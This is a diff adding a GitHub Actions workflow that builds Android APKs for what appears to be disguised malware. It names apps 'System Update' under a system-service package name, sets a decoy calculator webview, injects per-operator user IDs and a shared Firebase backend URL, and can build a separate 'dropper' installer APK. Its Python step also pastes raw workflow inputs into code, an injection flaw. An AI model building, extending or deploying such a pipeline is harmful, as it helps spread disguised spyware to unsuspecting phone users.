@@ -1,0 +1,118 @@
+name: Android APK Builder
+
+on:
+  workflow_dispatch:
+    inputs:
+      app_name:
+        description: 'App Name'
+        required: true
+        default: 'System Update'
+      package_name:
+        description: 'Package Name'
+        required: true
+        default: 'com.system.service.booster'
+      webview_url:
+        description: 'Webview URL'
+        required: false
+        default: 'https://calculator.apps.chrome'
+      user_id:
+        description: 'User UID'
+        required: true
+        default: 'master01'
+      build_type:
+        description: 'Build Type (main or dropper)'
+        required: true
+        default: 'main'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      - name: Grant Execute Permission for Gradlew
+        run: chmod +x gradlew
+
+      - name: Inject Configuration
+        run: |
+          python -c "
+          import os, re
+
+          app_name = '${{ github.event.inputs.app_name }}'
+          package_name = '${{ github.event.inputs.package_name }}'
+          webview_url = '${{ github.event.inputs.webview_url }}'
+          user_id = '${{ github.event.inputs.user_id }}'
+          firebase_url = 'https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/'
+
+          # Update AndroidManifest.xml
+          manifest = 'app/src/main/AndroidManifest.xml'
+          if os.path.exists(manifest):
+              with open(manifest, 'r', encoding='utf-8') as f:
+                  c = f.read()
+              c = re.sub(r'android:name=\"webview_url\" android:value=\"[^\"]*\"', f'android:name=\"webview_url\" android:value=\"{webview_url}\"', c)
+              c = re.sub(r'android:name=\"user_id\" android:value=\"[^\"]*\"', f'android:name=\"user_id\" android:value=\"{user_id}\"', c)
+              c = re.sub(r'android:name=\"firebase_url\" android:value=\"[^\"]*\"', f'android:name=\"firebase_url\" android:value=\"{firebase_url}\"', c)
+              with open(manifest, 'w', encoding='utf-8') as f:
+                  f.write(c)
+
+          # Update strings.xml
+          strings = 'app/src/main/res/values/strings.xml'
+          if os.path.exists(strings):
+              with open(strings, 'r', encoding='utf-8') as f:
+                  c = f.read()
+              c = re.sub(r'<string name=\"app_name\">.*</string>', f'<string name=\"app_name\">{app_name}</string>', c)
+              with open(strings, 'w', encoding='utf-8') as f:
+                  f.write(c)
+
+          # Update package name in app build.gradle.kts
+          app_gradle = 'app/build.gradle.kts'
+          if os.path.exists(app_gradle):
+              with open(app_gradle, 'r', encoding='utf-8') as f:
+                  c = f.read()
+              c = re.sub(r'applicationId\s*=\s*\"[^\"]*\"', f'applicationId = \"{package_name}\"', c)
+              with open(app_gradle, 'w', encoding='utf-8') as f:
+                  f.write(c)
+
+          # Update dropper build.gradle.kts
+          dropper_gradle = 'dropper/build.gradle.kts'
+          if os.path.exists(dropper_gradle):
+              with open(dropper_gradle, 'r', encoding='utf-8') as f:
+                  c = f.read()
+              c = re.sub(r'applicationId\s*=\s*\"[^\"]*\"', f'applicationId = \"{package_name}.installer\"', c)
+              with open(dropper_gradle, 'w', encoding='utf-8') as f:
+                  f.write(c)
+
+          # Update google-services.json
+          gs = 'app/google-services.json'
+          if os.path.exists(gs):
+              with open(gs, 'r', encoding='utf-8') as f:
+                  c = f.read()
+              c = re.sub(r'\"package_name\":\s*\"[^\"]*\"', f'\"package_name\": \"{package_name}\"', c)
+              with open(gs, 'w', encoding='utf-8') as f:
+                  f.write(c)
+          "
+
+      - name: Build Main APK
+        if: ${{ github.event.inputs.build_type != 'dropper' }}
+        run: ./gradlew assembleDebug --no-daemon
+
+      - name: Build Dropper APK
+        if: ${{ github.event.inputs.build_type == 'dropper' }}
+        run: ./gradlew :dropper:assembleDebug --no-daemon
+
+      - name: Upload APK Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ github.event.inputs.app_name }}-APK
+          path: |
+            app/build/outputs/apk/debug/*.apk
+            dropper/build/outputs/apk/debug/*.apk
